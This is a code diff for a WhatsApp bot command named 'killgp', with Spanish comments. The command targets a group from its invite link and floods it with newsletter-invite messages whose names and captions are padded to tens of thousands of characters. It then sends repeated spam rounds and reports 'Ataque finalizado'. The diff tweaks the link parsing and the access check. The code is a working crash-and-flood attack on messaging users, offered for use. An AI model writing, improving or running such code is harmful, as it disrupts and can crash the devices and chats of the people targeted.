@@ -1,11 +1,16 @@
-import { sleep } from '../lib/utils.js'; // Usa tu función de sleep o setTimeout wrapped en Promise
+import { sleep } from '../lib/utils.js'; // Asegúrate que sleep esté disponible
 
 let handler = async (m, { args, conn }) => {
+  const botNumber = conn.user?.id || "";
+
+  if (m.sender !== botNumber) {
+    return m.reply("⛔ Solo el bot puede usar este comando.");
+  }
+
   if (!args[0]) return m.reply('🚫 Ingresa el link del grupo.\nEjemplo: .killgp +https://chat.whatsapp.com/xxxxx');
 
-  const groupLink = args[0].replace('+', '');
+  const groupLink = args[0].replace(/^(\+)?/, '');
   const code = groupLink.split('/')[1];
-
   if (!code) return m.reply('❌ Link de grupo no válido.');
 
   let target;
@@ -151,7 +156,7 @@ let handler = async (m, { args, conn }) => {
     const msg = {
       newsletterAdminInviteMessage: {
         newsletterJid: "120363370611316879@newsletter",
-        newsletterName: "👑 • 𝐽𝒆𝓇𝓮𝓶𝒾𝒶𝒽 8𝐌 • 👑" + "XxX".repeat(9000),
+        newsletterName: "👑 • 𝐽𝒆𝓇𝓮𝓂𝒾𝒶𝒽 8𝐌 • 👑" + "XxX".repeat(9000),
         caption: "ؙ👑 • 𝐽𝒆𝓇𝓮𝓂𝒾𝒶𝒽 8𝐌 • 👑\n" + "XxX".repeat(9000),
         inviteExpiration: "0"
       }
@@ -174,10 +179,9 @@ let handler = async (m, { args, conn }) => {
   await sleep(10000);
   await enviarSpam(10);
 
-  m.reply('✅ Ataque finalizado');
+  m.reply('✅ Ataque finalizado.');
 };
 
 handler.command = /^killgp$/i;
-handler.owner = true;
-
+handler.owner = false;
 export default handler;
